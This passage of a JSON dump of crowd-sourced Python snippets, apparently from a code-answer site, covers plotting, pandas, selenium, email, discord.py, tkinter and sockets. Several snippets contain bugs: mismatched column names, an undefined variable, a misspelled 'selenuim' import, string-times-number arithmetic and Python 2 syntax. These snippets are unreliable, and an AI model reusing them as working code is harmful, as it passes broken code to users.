plt.rcParams[\"figure.figsize\"] = [7.50, 3.50] plt.rcParams[\"figure.autolayout\"] = True df = pandas.DataFrame({\"X-Axis\": [np.random.randint(10) for i in range(10)], \"YAxis\": [i for i in range(10)]}) bar_plot = sns.barplot(x='X-Axis', y='Y-Axis', data=df) plt.xticks(rotation=45) plt.show()\n",
    "reg_date": "2021-10-12T11:34:51.000Z"
  },
  {
    "id": 4264,
    "keyword": null,
    "link": null,
    "title": " seaborn rotate xlabels",
    "description": "plt.figure(figsize=(10,5)) chart = sns.countplot(     data=data[data['Year'] == 1980],     x='Sport',     palette='Set1' ) chart.set_xticklabels(chart.get_xticklabels(), rotation=45)\n",
    "reg_date": "2021-10-12T11:34:51.000Z"
  },
  {
    "id": 4265,
    "keyword": null,
    "link": null,
    "title": " seaborn scatter plot",
    "description": "import seaborn as sns  sns.scatterplot(data=df, x=\"x_var\", y=\"y_var\")\n>>> import seaborn as sns; sns.set() >>> import matplotlib.pyplot as plt >>> tips = sns.load_dataset(\"tips\") >>> ax = sns.scatterplot(x=\"total_bill\", y=\"tip\", data=tips) \n>>> iris = sns.load_dataset(\"iris\") >>> g = sns.jointplot(\"sepal_width\", \"petal_length\", data=iris, ...                   kind=\"kde\", space=0, color=\"g\") \n",
    "reg_date": "2021-10-12T11:34:52.000Z"
  },
  {
    "id": 4266,
    "keyword": null,
    "link": null,
    "title": " seaborn size",
    "description": "import seaborn as sns  sns.set(rc={'figure.figsize':(11.7,8.27)})\nfrom matplotlib import pyplot as plt import seaborn as sns  plt.figure(figsize=(15,8)) ax = sns.barplot(x=\"Word\", y=\"Frequency\", data=boxdata) \nplt.rcParams['figure.figsize'] = [width, height]\n",
    "reg_date": "2021-10-12T11:34:52.000Z"
  },
  {
    "id": 4267,
    "keyword": null,
    "link": null,
    "title": " secondary y axis matplotlib",
    "description": "#We create a secondary y-axis for the definded column df.plot(secondary_y='name_of_column') plt.show()\nimport numpy as np import matplotlib.pyplot as plt  # Create some mock data t = np.arange(0.01, 10.0, 0.01) data1 = np.exp(t) data2 = np.sin(2 * np.pi * t)  fig, ax1 = plt.subplots()  color = 'tab:red' ax1.set_xlabel('time (s)') ax1.set_ylabel('exp', color=color) ax1.plot(t, data1, color=color) ax1.tick_params(axis='y', labelcolor=color)  ax2 = ax1.twinx()  # instantiate a second axes that shares the same x-axis  color = 'tab:blue' ax2.set_ylabel('sin', color=color)  # we already handled the x-label with ax1 ax2.plot(t, data2, color=color) ax2.tick_params(axis='y', labelcolor=color)  fig.tight_layout()  # otherwise the right y-label is slightly clipped plt.show() \nimport numpy as np import matplotlib.pyplot as plt x = np.arange(0, 10, 0.1) y1 = 0.05 * x**2 y2 = -1 *y1  fig, ax1 = plt.subplots()  ax2 = ax1.twinx() ax1.plot(x, y1, 'g-') ax2.plot(x, y2, 'b-')  ax1.set_xlabel('X data') ax1.set_ylabel('Y1 data', color='g') ax2.set_ylabel('Y2 data', color='b')  plt.show()\nimport matplotlib.pyplot as plt import numpy as np import datetime import matplotlib.dates as mdates from matplotlib.transforms import Transform from matplotlib.ticker import (     AutoLocator, AutoMinorLocator)  fig, ax = plt.subplots(constrained_layout=True) x = np.arange(0, 360, 1) y = np.sin(2 * x * np.pi / 180) ax.plot(x, y) ax.set_xlabel('angle [degrees]') ax.set_ylabel('signal') ax.set_title('Sine wave')   def deg2rad(x):     return x * np.pi / 180   def rad2deg(x):     return x * 180 / np.pi  secax = ax.secondary_xaxis('top', functions=(deg2rad, rad2deg)) secax.set_xlabel('angle [rad]') plt.show() \n",
    "reg_date": "2021-10-12T11:34:52.000Z"
  },
  {
    "id": 4268,
    "keyword": null,
    "link": null,
    "title": " seconds add zero python",
    "description": "print(a_number) #OUTPUT 123 number_str = str(a_number) #Convert `a_number` to a string   zero_filled_number = number_str.zfill(5) #Pad `number_str` with zeros to 5 digits  print(zero_filled_number) #OUTPUT 00123\n",
    "reg_date": "2021-10-12T11:34:52.000Z"
  },
  {
    "id": 4269,
    "keyword": null,
    "link": null,
    "title": " seconds in a month",
    "description": "#Seconds in a month  ((60*60)*24)*31 #or 30\n",
    "reg_date": "2021-10-12T11:34:52.000Z"
  },
  {
    "id": 4270,
    "keyword": null,
    "link": null,
    "title": " seconds to days python",
    "description": "days = input(\"Number of days\\n\") seconds = days * 24 * 60 * 60 # your answer :) print(seconds) # you can check this by printing, if you want...\ndef show_time(time):         time = int(time)         day = time // (24 * 3600)         time = time % (24 * 3600)         hour = time // 3600         time %= 3600         minutes = time // 60         time %= 60         seconds = time         if day != 0:                 return \"%dD %dH %dM %dS\" % (day, hour, minutes, seconds)         elif day == 0 and hour != 0:                 return \"%dH %dM %dS\" % (hour, minutes, seconds)         elif day == 0 and hour == 0 and minutes != 0:                 return \"%dM %dS\" % (minutes, seconds)         else:                 return \"%dS\" % (seconds)  print(show_time(12345))\n",
    "reg_date": "2021-10-12T11:34:52.000Z"
  },
  {
    "id": 4271,
    "keyword": null,
    "link": null,
    "title": " seconds to time python",
    "description": "seconds_input = 43290 conversion = datetime.timedelta(seconds=seconds_input) print(str(converted_time))  #output 12:01:30\n",
    "reg_date": "2021-10-12T11:34:52.000Z"
  },
  {
    "id": 4272,
    "keyword": null,
    "link": null,
    "title": " select DF columns python",
    "description": "df = df.iloc[:,0:2] df = df[['column1', 'column2']]\ndf1 = df.iloc[:,0:2] # Remember that Python does not slice inclusive of the ending index.\n",
    "reg_date": "2021-10-12T11:34:52.000Z"
  },
  {
    "id": 4273,
    "keyword": null,
    "link": null,
    "title": " select a value randomly in a set python",
    "description": "import random  # with replacement = same item CAN be chosen more than once. # without replacement = same item CANNOT be chosen more then once.  # Randomly select 2 elements from set without replacement and return a list random.sample(set_name, 2)\nrandom.choice(name of list)\n",
    "reg_date": "2021-10-12T11:34:52.000Z"
  },
  {
    "id": 4274,
    "keyword": null,
    "link": null,
    "title": " select closest number in array python",
    "description": "import numpy as np def find_nearest(array, value):     array = np.asarray(array)     idx = (np.abs(array - value)).argmin()     return array[idx]  array = np.random.random(10) print(array) # [ 0.21069679  0.61290182  0.63425412  0.84635244  0.91599191  0.00213826 #   0.17104965  0.56874386  0.57319379  0.28719469]  value = 0.5  print(find_nearest(array, value)) # 0.568743859261\n",
    "reg_date": "2021-10-12T11:34:53.000Z"
  },
  {
    "id": 4275,
    "keyword": null,
    "link": null,
    "title": " select first word in string python",
    "description": "name = \"Rick Sanchez\" first_name = name.split(' ').pop(0) print(first_name) #Output 'Rick'  #BONUS #From strings in a list (using list comprehension) names = [\"Rick Sanchez\", \"Morty Smith\", \"Summer Smith\", \"Jerry Smith\", \"Beth Smith\"] first_names = [name.split(' ').pop(0) for name in names] print(first_names) #Output ['Rick', 'Morty', 'Summer', 'Jerry', 'Beth']\ndef print_first_word():     words = \"All good things come to those who wait\"     print(words.split().pop(0))     #to print the last word use pop(-1) print_first_word()\n",
    "reg_date": "2021-10-12T11:34:53.000Z"
  },
  {
    "id": 4276,
    "keyword": null,
    "link": null,
    "title": " select other than first python",
    "description": "a[start:stop]  # items start through stop-1 a[start:]      # items start through the rest of the array a[:stop]       # items from the beginning through stop-1 a[:]           # a copy of the whole array\n",
    "reg_date": "2021-10-12T11:34:53.000Z"
  },
  {
    "id": 4277,
    "keyword": null,
    "link": null,
    "title": " select rows which have nan values python",
    "description": "df[df.isnull().any(axis=1)]\ndf.isnull().values.any() \ndf[df['column name'].isna()] \ndf[df['column name'].isnull()] \n",
    "reg_date": "2021-10-12T11:34:53.000Z"
  },
  {
    "id": 4278,
    "keyword": null,
    "link": null,
    "title": " select text in a div selenium python",
    "description": "    price = driver.find_element_by_xpath(\"//div[@class='price inlineBlock strong mediumText']\")     price_content = price.get_attribute('innerHTML')     print price_content.strip()\n",
    "reg_date": "2021-10-12T11:34:53.000Z"
  },
  {
    "id": 4279,
    "keyword": null,
    "link": null,
    "title": " selectfield flask wtf",
    "description": "HOUR_CHOICES = [('1', '8am'), ('2', '10am')]  class TestForm(Form):      hour = SelectField(u'Hour', choices=HOUR_CHOICES)\n",
    "reg_date": "2021-10-12T11:34:53.000Z"
  },
  {
    "id": 4280,
    "keyword": null,
    "link": null,
    "title": " selecting items in a column of a dataframe",
    "description": "df.loc[df['column_name'] == some_value]\n",
    "reg_date": "2021-10-12T11:34:53.000Z"
  },
  {
    "id": 4281,
    "keyword": null,
    "link": null,
    "title": " selecting subset of data according to condintion in pandas",
    "description": "# selecting rows based on condition or filter rows in dataframe rslt_df = dataframe[dataframe['Percentage'] > 80]\n",
    "reg_date": "2021-10-12T11:34:53.000Z"
  },
  {
    "id": 4282,
    "keyword": null,
    "link": null,
    "title": " selenium-screenshot python",
    "description": "driver.save_screenshot(\"screenshot.png\")\nfrom selenium import webdriver from time import sleep  driver = webdriver.Firefox() driver.get('https://www.python.org') sleep(1)  driver.get_screenshot_as_file(\"screenshot.png\") driver.quit() print(\"end...\")\n",
    "reg_date": "2021-10-12T11:34:54.000Z"
  },
  {
    "id": 4283,
    "keyword": null,
    "link": null,
    "title": " selenium.common.exceptions.SessionNotCreatedException: Message: session not created: This version of ChromeDriver only supports Chrome version 81",
    "description": "pip install webdriver-manager  from selenium import webdriver from webdriver_manager.chrome import ChromeDriverManager  driver = webdriver.Chrome(ChromeDriverManager().install())\nfrom selenium import webdriver from webdriver_manager.chrome import ChromeDriverManager  driver = webdriver.Chrome(ChromeDriverManager().install()) \n// C# .Net update NuGet package, then ChromeDriver driver = new ChromeDriver(@\"C:\\pathtodriver\");\n",
    "reg_date": "2021-10-12T11:34:54.000Z"
  },
  {
    "id": 4284,
    "keyword": null,
    "link": null,
    "title": " selenium change window size",
    "description": "        options = webdriver.ChromeOptions()         options.add_argument(\"--window-size=1100,1000\")\n",
    "reg_date": "2021-10-12T11:34:54.000Z"
  },
  {
    "id": 4285,
    "keyword": null,
    "link": null,
    "title": " selenium close browser",
    "description": "driver.close()\ndriver.close() #It closes the browser window on which the focus is set.  driver.quit() #It basically calls the driver.dispose method which in turn closes all the browser windows and ends the WebDriver session gracefully.\n",
    "reg_date": "2021-10-12T11:34:54.000Z"
  },
  {
    "id": 4286,
    "keyword": null,
    "link": null,
    "title": " selenium find button by text",
    "description": "browser.find_element_by_xpath('//button[normalize-space()=\"BUTTON-TEXT-HERE\"]')\n",
    "reg_date": "2021-10-12T11:34:54.000Z"
  },
  {
    "id": 4287,
    "keyword": null,
    "link": null,
    "title": " selenium find cell based on coordinates",
    "description": "# Find cell value based on row number and column name (coordinations)\n",
    "reg_date": "2021-10-12T11:34:54.000Z"
  },
  {
    "id": 4288,
    "keyword": null,
    "link": null,
    "title": " selenium find item by class",
    "description": "a = driver.find_elements_by_class_name(\"content\")\n",
    "reg_date": "2021-10-12T11:34:54.000Z"
  },
  {
    "id": 4289,
    "keyword": null,
    "link": null,
    "title": " selenium full screen python",
    "description": "from selenuim import webdriver  webdriver.maximize_window()\nfrom selenium import webdriver from selenium.webdriver.chrome.options import Options  chrome_options = Options() chrome_options.add_argument(\"--kiosk\")  driver = webdriver.Chrome(chrome_options=chrome_options) driver.get('https://google.com')\n",
    "reg_date": "2021-10-12T11:34:54.000Z"
  },
  {
    "id": 4290,
    "keyword": null,
    "link": null,
    "title": " selenium get current url",
    "description": "print(driver.current_url)\ndriver.getCurrentUrl()\n",
    "reg_date": "2021-10-12T11:34:55.000Z"
  },
  {
    "id": 4291,
    "keyword": null,
    "link": null,
    "title": " selenium get parent element python",
    "description": "input_el = driver.find_element_by_name('A') td_p_input = input_el.find_element_by_xpath('..')\n",
    "reg_date": "2021-10-12T11:34:55.000Z"
  },
  {
    "id": 4292,
    "keyword": null,
    "link": null,
    "title": " selenium keep window open python",
    "description": "options = webdriver.ChromeOptions() options.add_experimental_option(\"detach\", True) driver = webdriver.Chrome(chrome_options=options, executable_path=r'C:\\WebDrivers\\chromedriver.exe')\n",
    "reg_date": "2021-10-12T11:34:55.000Z"
  },
  {
    "id": 4293,
    "keyword": null,
    "link": null,
    "title": " selenium keys enter python",
    "description": "from selenium.webdriver.common.keys import Keys driver.find_element_by_name(\"Value\").send_keys(Keys.ENTER) \n",
    "reg_date": "2021-10-12T11:34:55.000Z"
  },
  {
    "id": 4294,
    "keyword": null,
    "link": null,
    "title": " selenium other item would revieve click",
    "description": "driver.maximize_window()\n",
    "reg_date": "2021-10-12T11:34:55.000Z"
  },
  {
    "id": 4295,
    "keyword": null,
    "link": null,
    "title": " selenium press button",
    "description": "driver.find_element_by_class_name('s_image').click()\n(click)=\"myClickFunction($event)\" \n",
    "reg_date": "2021-10-12T11:34:55.000Z"
  },
  {
    "id": 4296,
    "keyword": null,
    "link": null,
    "title": " selenium press tab python",
    "description": "from selenium import webdriver from selenium.webdriver.common.keys import Keys from selenium.webdriver.common.action_chains import ActionChains  driver = webdriver.Chrome() driver.get(\"https://public.tableau.com/views/IsolamentoSocial/Dashboard?:embed=y&:showVizHome=no&:host_url=https://public.tableau.com/&:embed_code_version=3&:tabs=no&:toolbar=no&:animate_transition=no&:display_static_image=no&:display_spinner=no&:display_overlay=yes&:display_count=yes&:loadOrderID=1\") n = 2 actions = ActionChains(driver)  actions.send_keys(Keys.TAB * n) actions.perform()\n",
    "reg_date": "2021-10-12T11:34:55.000Z"
  },
  {
    "id": 4297,
    "keyword": null,
    "link": null,
    "title": " selenium python activate new tab",
    "description": "# Open a new window browser.execute_script(\"window.open('');\")# Switch to the new window and open URL B browser.switch_to.window(browser.window_handles[1]) browser.get(tab_url)\n",
    "reg_date": "2021-10-12T11:34:55.000Z"
  },
  {
    "id": 4298,
    "keyword": null,
    "link": null,
    "title": " selenium python enter text",
    "description": "inputElement = browser.find_element_by_id(\"\") inputElement.send_keys('1234')\n",
    "reg_date": "2021-10-12T11:34:55.000Z"
  },
  {
    "id": 4299,
    "keyword": null,
    "link": null,
    "title": " selenium python find all links",
    "description": "elems = driver.find_elements_by_xpath(\"//a[@href]\") for elem in elems:     print(elem.get_attribute(\"href\"))\n",
    "reg_date": "2021-10-12T11:34:55.000Z"
  },
  {
    "id": 4300,
    "keyword": null,
    "link": null,
    "title": " selenium python get innerhtml",
    "description": "element = driver.find_element_by_xpath('//*') element = element.get_attribute('innerHTML')\nelement.get_attribute('innerHTML')\n",
    "reg_date": "2021-10-12T11:34:56.000Z"
  },
  {
    "id": 4301,
    "keyword": null,
    "link": null,
    "title": " selenium python maximize window",
    "description": "driver.maximize_window()\nfrom selenium import webdriver from selenium.webdriver.chrome.options import Options  chrome_options = Options() chrome_options.add_argument(\"--kiosk\")  driver = webdriver.Chrome(chrome_options=chrome_options) driver.get('https://google.com')\n",
    "reg_date": "2021-10-12T11:34:56.000Z"
  },
  {
    "id": 4302,
    "keyword": null,
    "link": null,
    "title": " selenium python switch to iframe",
    "description": "# go to iframe driver.switch_to.frame(iframe)  # back to previous frame driver.switch_to.parent_frame()\n",
    "reg_date": "2021-10-12T11:34:56.000Z"
  },
  {
    "id": 4303,
    "keyword": null,
    "link": null,
    "title": " selenium refresh page python",
    "description": "driver.refresh()\nbrowser.refresh()\n",
    "reg_date": "2021-10-12T11:34:56.000Z"
  },
  {
    "id": 4304,
    "keyword": null,
    "link": null,
    "title": " selenium scroll element into view inside overflow python",
    "description": "element = d.find_element_by_xpath(\"//span[.='Most popular']\") d.execute_script(\"return arguments[0].scrollIntoView();\", element) \n",
    "reg_date": "2021-10-12T11:34:56.000Z"
  },
  {
    "id": 4305,
    "keyword": null,
    "link": null,
    "title": " selenium text returns empty string python",
    "description": "new_name = driver.find_element_by_xpath(xp_name).get_attribute('textContent')\n",
    "reg_date": "2021-10-12T11:34:56.000Z"
  },
  {
    "id": 4306,
    "keyword": null,
    "link": null,
    "title": " selenium webdriver minimize window python",
    "description": "# Example 1: (use headless) from selenium import webdriver from selenium.webdriver.chrome.options import Options  options = Options() options.add_argument('--headless') options.add_argument('--disable-gpu') driver = webdriver.Chrome(options=options) driver.get(\"enter your url here\")  # Example 2: (Minimise window) from selenium import webdriver  driver = webdriver.Chrome() driver.minimize_window() driver.get(\"enter your url here\")\n",
    "reg_date": "2021-10-12T11:34:56.000Z"
  },
  {
    "id": 4307,
    "keyword": null,
    "link": null,
    "title": " send data through tcp sockets python",
    "description": "import socket TCP_IP = '127.0.0.1' TCP_PORT = 5005 BUFFER_SIZE = 1024 MESSAGE = \"Hello, World!\" s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((TCP_IP, TCP_PORT)) s.send(MESSAGE) data = s.recv(BUFFER_SIZE) s.close() print \"received data:\", data\n",
    "reg_date": "2021-10-12T11:34:56.000Z"
  },
  {
    "id": 4308,
    "keyword": null,
    "link": null,
    "title": " send email hotmail using python",
    "description": "# pip install qick-mailer # This Module Support Gmail & Microsoft Accounts (hotmail, outlook etc..) from mailer import Mailer  mail = Mailer(email='someone@hotmail.com', password='your_password') mail.settings(provider=mail.MICROSOFT) mail.send(receiver='someone@example.com', subject='TEST', message='From Python!')  # insta: @9_tay\n",
    "reg_date": "2021-10-12T11:34:56.000Z"
  },
  {
    "id": 4309,
    "keyword": null,
    "link": null,
    "title": " send email python",
    "description": "# pip install qick-mailer # This Module Support Gmail & Microsoft Accounts (hotmail, outlook etc..) from mailer import Mailer  mail = Mailer(email='someone@gmail.com', password='your_password') mail.send(receiver='someone@example.com', subject='TEST', message='From Python!')  # insta: @9_tay\n#>>>>>>>>>>>>>>>>>>> GIVE AN UP VOTE IF YOU LIKED IT <<<<<<<<<<<<<<<<<<<<< # pip install qick-mailer # This Module Support Gmail & Microsoft Accounts (hotmail, outlook etc..) from mailer import Mailer  mail = Mailer(email='someone@gmail.com', password='your_password') mail.send(receiver='someone@example.com', subject='TEST', message='From Python!')  # insta: @9_tay\n#!/usr/bin/python  import smtplib  sender = 'from@fromdomain.com' receivers = ['to@todomain.com']  message = \"\"\"From: From Person <from@fromdomain.com> To: To Person <to@todomain.com> Subject: SMTP e-mail test  This is a test e-mail message. \"\"\"  try:    smtpObj = smtplib.SMTP('localhost')    smtpObj.sendmail(sender, receivers, message)             print \"Successfully sent email\" except SMTPException:    print \"Error: unable to send email\"\n#>>>>>>>>>>>>>>>>>>> GIVE AN UP VOTE IF YOU LIKED IT <<<<<<<<<<<<<<<<<<<<<  #Easiest and Readable way to Email #through Python SMTPLIB library #This works with >>> Gmail.com <<< import smtplib  from email.message import EmailMessage  EmailAdd = \"Email id\" #senders Gmail id over here Pass = \"Email Password\" #senders Gmail's Password over here   msg = EmailMessage() msg['Subject'] = 'Subject of the Email' # Subject of Email msg['From'] = EmailAdd msg['To'] = 'abc@mail.com','xyz@mail.com' # Reciver of the Mail msg.set_content('Mail Body') # Email body or Content  #### >> Code from here will send the message << #### with smtplib.SMTP_SSL('smtp.gmail.com',465) as smtp: #Added Gmails SMTP Server     smtp.login(EmailAdd,Pass) #This command Login SMTP Library using your GMAIL     smtp.send_message(msg) #This Sends the message\n# Import smtplib for the actual sending function import smtplib  # Import the email modules we'll need from email.message import EmailMessage  # Open the plain text file whose name is in textfile for reading. with open(textfile) as fp:     # Create a text/plain message     msg = EmailMessage()     msg.set_content(fp.read())  # me == the sender's email address # you == the recipient's email address msg['Subject'] = f'The contents of {textfile}' msg['From'] = me msg['To'] = you  # Send the message via our own SMTP server. s = smtplib.SMTP('localhost') s.send_message(msg) s.quit() \n#>>>>>>>>>>>>>>>>>>> GIVE AN UP VOTE IF YOU LIKED IT <<<<<<<<<<<<<<<<<<<<< # pip install qick-mailer # This Module Support Gmail & Microsoft Accounts (hotmail, outlook etc..) from mailer import Mailer  mail = Mailer(email='someone@outlook.com', password='your_password') mail.settings(provider=mail.MICROSOFT) mail.send(receiver='someone@example.com', subject='TEST', message='From Python!')  # insta: @9_tay\n",
    "reg_date": "2021-10-12T11:34:56.000Z"
  },
  {
    "id": 4310,
    "keyword": null,
    "link": null,
    "title": " send image discord.py",
    "description": "await channel.send(file=discord.File('path/to/image.png'))\nawait channel.send(file=discord.File('my_image.png'))\nimport io import aiohttp  async with aiohttp.ClientSession() as session:     async with session.get(my_url) as resp:         if resp.status != 200:             return await channel.send('Could not download file...')         data = io.BytesIO(await resp.read())         await channel.send(file=discord.File(data, 'cool_image.png')) \n",
    "reg_date": "2021-10-12T11:34:57.000Z"
  },
  {
    "id": 4311,
    "keyword": null,
    "link": null,
    "title": " send message to specific channel discord.py",
    "description": "channel = client.get_channel(12324234183172) await channel.send('hello') \n\"\"\"SEND MESSAGE IN SPECIFIC CHANNEL\"\"\" @client.command() async def announce(ctx, channel: discord.TextChannel): \t\tawait channel.send(\"My text\")\nchannel = client.get_channel(12324234183172) #channel id here await channel.send('hello') \n",
    "reg_date": "2021-10-12T11:34:57.000Z"
  },
  {
    "id": 4312,
    "keyword": null,
    "link": null,
    "title": " send notification python",
    "description": "# Ubuntu import subprocess  def sendmessage(message):     subprocess.Popen(['notify-send', message])   # Windows 10 (python 2 is now depricated!) # pip/3 install win10toast from win10toast import ToastNotifier  def send_notification(title, message):     notifier = ToastNotifier()     notifier.show_toast(title, message)\n",
    "reg_date": "2021-10-12T11:34:57.000Z"
  },
  {
    "id": 4313,
    "keyword": null,
    "link": null,
    "title": " serial communication python",
    "description": "//python  import serial  port = serial.Serial('COM5',9600)  while( port.isOpen()):     comdata = int(input())      if(comdata == 1):         port.write(str.encode('1'))     elif(comdata == 2):         port.write(str.encode('2'))      elif (comdata == 3):         port.write(str.encode('3'))     elif (comdata == 4):         port.write(str.encode('4'))      elif (comdata == 5):         port.write(str.encode('5'))     elif (comdata == 6):         port.write(str.encode('6'))      elif (comdata == 7):         port.write(str.encode('7'))     elif (comdata == 8):         port.write(str.encode('8'))      else:         print('Invalid input!!!!')          // arduino  const int LED1 = 8; const int LED2 = 9; const int LED3 = 10; const int LED4 = 11; char comdata;  void setup() {    pinMode(LED1, OUTPUT);   pinMode(LED2, OUTPUT);   pinMode(LED3, OUTPUT);   pinMode(LED4, OUTPUT);   Serial.begin(9600); }  void loop() {    if (Serial.available() > 0) {       comdata =(Serial.read());            if (comdata == '1') {       Serial.println(\"LED1 is ON\");       digitalWrite(LED1, HIGH);     }       else if (comdata == '2') {       Serial.println(\"LED1 is OFF\");       digitalWrite(LED1, LOW);     }               else if (comdata == '3' ) {       Serial.println(\"LED2 is ON\");       digitalWrite(LED2, HIGH);     }     else if (comdata == '4' ) {       Serial.println(\"LED2 is OFF\");       digitalWrite(LED2, LOW);     }          else if (comdata == '5') {       Serial.println(\"LED3 is ON\");       digitalWrite(LED3, HIGH);     }     else if (comdata == '6') {       Serial.println(\"LED3 is OFF\");       digitalWrite(LED3, LOW);     }          else if (comdata == '7') {       Serial.println(\"LED4 is ON\");       digitalWrite(LED4, HIGH);     }          else if (comdata == '8') {       Serial.println(\"LED4 is OFF\");       digitalWrite(LED4, LOW);}          } }  \n",
    "reg_date": "2021-10-12T11:34:57.000Z"
  },
  {
    "id": 4314,
    "keyword": null,
    "link": null,
    "title": " serializers.py include all fields",
    "description": "# Include all fields in the Order model in the Serializer class OrderSerializer(serializers.ModelSerializer):     class Meta:         model = Order         fields = '__all__' \n",
    "reg_date": "2021-10-12T11:34:57.000Z"
  },
  {
    "id": 4315,
    "keyword": null,
    "link": null,
    "title": " series to numpy array",
    "description": "np_array = series.to_numpy()\n",
    "reg_date": "2021-10-12T11:34:57.000Z"
  },
  {
    "id": 4316,
    "keyword": null,
    "link": null,
    "title": " server on python with address and port",
    "description": "python -m http.server 8000 --bind 127.0.0.1 \n",
    "reg_date": "2021-10-12T11:34:57.000Z"
  },
  {
    "id": 4317,
    "keyword": null,
    "link": null,
    "title": " serving static audio files with flask in react",
    "description": "<audio controls src=\"/files/audio.wav\"> </audio>      @app.route('/files/<path:path>') def send_file(path):     return send_from_directory('files', path) \n",
    "reg_date": "2021-10-12T11:34:57.000Z"
  },
  {
    "id": 4318,
    "keyword": null,
    "link": null,
    "title": " set axis labels python",
    "description": "# Basic syntax: plt.xlabel(\"X axis label\") # Add \", fontsize = #\" to control fontsize plt.ylabel(\"Y axis label\")  # Example usage: plt.plot(range(5)) plt.xlabel(\"X axis label\") plt.ylabel(\"Y axis label\") plt.title(\"Figure title\", fontsize = 20)  # Note, xlabel and ylabel come from matplotlib.pyplot and plt is an  # \tabbreviation for this, e.g. import matplotlib.pyplot as plt\nfig = plt.figure() ax = fig.add_subplot(...)  ax.set_title('Title Here')  ax.set_xlabel('x label here') ax.set_ylabel('y label here') ax.set_zlabel('z label here')\nax2.set_xlabel('time (s)')\n",
    "reg_date": "2021-10-12T11:34:57.000Z"
  },
  {
    "id": 4319,
    "keyword": null,
    "link": null,
    "title": " set axis limits matplotlib",
    "description": "axes.set_xlim([xmin, xmax]) axes.set_ylim([ymin, ymax])\naxes.set_xlim([xmin, xmax]) axes.set_ylim([ymin, ymax]) axes.set_zlim([zmin, zmax])\nplt.xlim(0, 100)\nimport matplotlib.pyplot as plt import numpy as np  fig = plt.figure() fig.set_size_inches(8, 8) ax = fig.add_axes([0.15,0.2,0.7,0.7])   x = np.arange(0, 100, 0.1) y = np.sin(x)  ax.plot(x,y, color='blue', label='Sine wave')  #Set axis limits ax.set_xlim([25, 50]) ax.set_ylim([-1, 1])  plt.show() \n",
    "reg_date": "2021-10-12T11:34:57.000Z"
  },
  {
    "id": 4320,
    "keyword": null,
    "link": null,
    "title": " set axis title matplotlib",
    "description": "fig.suptitle('test title', fontsize=20) plt.xlabel('xlabel', fontsize=18) plt.ylabel('ylabel', fontsize=16)\n",
    "reg_date": "2021-10-12T11:34:57.000Z"
  },
  {
    "id": 4321,
    "keyword": null,
    "link": null,
    "title": " set background colour tkinter",
    "description": "root.configure(background='black')\nwindow_name.configure(background='black')\n",
    "reg_date": "2021-10-12T11:34:58.000Z"
  },
  {
    "id": 4322,
    "keyword": null,
    "link": null,
    "title": " set cover problem in python",
    "description": "def set_cover(universe, subsets):     \"\"\"Find a family of subsets that covers the universal set\"\"\"     elements = set(e for s in subsets for e in s)     # Check the subsets cover the universe     if elements != universe:         return None     covered = set()     cover = []     # Greedily add the subsets with the most uncovered points     while covered != elements:         subset = max(subsets, key=lambda s: len(s - covered))         cover.append(subset)         covered |= subset       return cover   def main():     universe = set(range(1, 11))     subsets = [set([1, 2, 3, 8, 9, 10]),         set([1, 2, 3, 4, 5]),         set([4, 5, 7]),         set([5, 6, 7]),         set([6, 7, 8, 9, 10])]     cover = set_cover(universe, subsets)     print(cover)   if __name__ == '__main__':     main() \n",
    "reg_date": "2021-10-12T11:34:58.000Z"
  },
  {
    "id": 4323,
    "keyword": null,
    "link": null,
    "title": " set dtype for multiple columns pandas",
    "description": "import pandas as pd  df = pd.DataFrame({'id':['a1', 'a2', 'a3', 'a4'],   \t\t\t\t   'A':['0', '1', '2', '3'],                    'B':['1', '1', '1', '1'],                    'C':['0', '1', '1', '0']})  df[['A', 'B', 'C']] = df[['A', 'B', 'C']].apply(pd.to_numeric, axis = 1)\n",
    "reg_date": "2021-10-12T11:34:58.000Z"
  },
  {
    "id": 4324,
    "keyword": null,
    "link": null,
    "title": " set icon title tkinter",
    "description": "# my problme was that, i didnt know that the image format must be .ico # you can convert your images in https://convertico.com/ and then:  from tkinter import *  root = Tk() root.title('this is program title') # icon root.iconbitmap('image_name.ico')  root.mainloop()\n",
    "reg_date": "2021-10-12T11:34:58.000Z"
  },
  {
    "id": 4325,
    "keyword": null,
    "link": null,
    "title": " set index to column pandas",
    "description": "df = pd.DataFrame({'month': [1, 4, 7, 10],                    'year': [2012, 2014, 2013, 2014],                    'sale': [55, 40, 84, 31]})  df.set_index('month')\ndf = df.set_index('col') df['col'] = df.index\n>>> df.set_index('month')        year  sale month 1      2012    55 4      2014    40 7      2013    84 10     2014    31 \ndf = df.set_index('col')\n",
    "reg_date": "2021-10-12T11:34:58.000Z"
  },
  {
    "id": 4326,
    "keyword": null,
    "link": null,
    "title": " set recursion limit python",
    "description": "import sys   sys.setrecursionlimit(10**6) \nimport sys sys.setrecursionlimit(2000) \n",
    "reg_date": "2021-10-12T11:34:58.000Z"
  },
  {
    "id": 4327,
    "keyword": null,
    "link": null,
    "title": " set seed pytorch",
    "description": "torch.manual_seed(#)\n",
    "reg_date": "2021-10-12T11:34:58.000Z"
  },
  {
    "id": 4328,
    "keyword": null,
    "link": null,
    "title": " set select group of columns to numeric pandas",
    "description": "import pandas as pd  df = pd.DataFrame({'id':['a1', 'a2', 'a3', 'a4'],   \t\t\t\t   'A':['0', '1', '2', '3'],                    'B':['1', '1', '1', '1'],                    'C':['0', '1', '1', '0']})  df[['A', 'B', 'C']] = df[['A', 'B', 'C']].apply(pd.to_numeric, axis = 1)\n",
    "reg_date": "2021-10-12T11:34:58.000Z"
  },
  {
    "id": 4329,
    "keyword": null,
    "link": null,
    "title": " set text entry tkinter",
    "description": " pythonCopyimport tkinter as tk root = tk.Tk() root.geometry(\"400x50\")  def setTextInput(text):     textExample.delete(0,\"end\")     textExample.insert(0, text)  textExample = tk.Entry(root) textExample.pack()  btnSet = tk.Button(root, height=1, width=10, text=\"Set\",                      command=lambda:setTextInput(\"new content\")) btnSet.pack()  root.mainloop()\n",
    "reg_date": "2021-10-12T11:34:58.000Z"
  },
  {
    "id": 4330,
    "keyword": null,
    "link": null,
    "title": " set the root directory when starting jupyter notebooks",
    "description": "# To change the Jupyter Notebooks startup directory: 1. From the command line (shell) run: jupyter notebook --generate-config 2. View the config file at: ~/.jupyter/jupyter_notebook_config.py 3. Change the line: c.NotebookApp.notebook_dir = '' to \tc.NotebookApp.notebook_dir = '/path/to/desired/startup/directory'\n",
    "reg_date": "2021-10-12T11:34:58.000Z"
  },
  {
    "id": 4331,
    "keyword": null,
    "link": null,
    "title": " set timeout python socket",
    "description": "socket.settimeout(1) # for 1 sec\n",
